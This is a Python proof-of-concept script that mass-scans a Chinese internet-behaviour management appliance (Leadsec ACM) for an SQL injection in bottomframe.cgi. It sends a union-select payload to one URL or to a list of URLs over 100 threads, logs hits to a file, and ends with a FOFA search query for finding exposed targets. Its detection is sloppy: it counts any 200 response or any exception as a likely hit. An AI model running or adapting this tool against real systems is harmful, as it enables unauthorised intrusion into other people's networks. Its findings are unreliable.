import argparse, requests, sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """网御ACM上网行为管理系统bottomframe.cgi SQL注入漏洞"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description='网御ACM上网行为管理系统bottomframe.cgi SQL注入漏洞')
    parser.add_argument('-u', '--url', dest='url', type=str, help="请输入你要测试的URL")
    parser.add_argument('-f', '--file', dest='file', type=str, help="请输入你要批量测试的文件路径")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload = "/bottomframe.cgi?user_name=%27))%20union%20select%20md5(1)%23"
    headers = {
        "User-Agent:Mozilla/5.0(WindowsNT10.0;Win64;x64;rv":"130.0)Gecko/20100101Firefox/130.0",
        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
        "Accept-Language":"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding":"gzip,deflate,br",
        "Upgrade-Insecure-Requests":"1",
        "Sec-Fetch-Dest":"document",
        "Sec-Fetch-Mode":"navigate",
        "Sec-Fetch-Site":"cross-site",
        "Sec-Fetch-User":"?1",
        "Priority":"u=0,i",
        "Te":"trailers",
        "Connection":"keep-alive",
    }
    try:
        response = requests.get(url=target + payload, headers=headers, verify=False, timeout=10)
        if response.status_code == 200 :
            print(f"[+]{target}存在sql注入漏洞")
            with open('result.txt', 'a') as f:
                f.write(f"{target}存在sql注入漏洞\n")
        else:
            print(f"[-]{target}不存在ql注入漏洞")
    except:
        print(f"{target}可能存在sql注入漏洞")
if __name__ == '__main__':
    main()
# fofa语句
# app="网御星云-上网行为管理系统"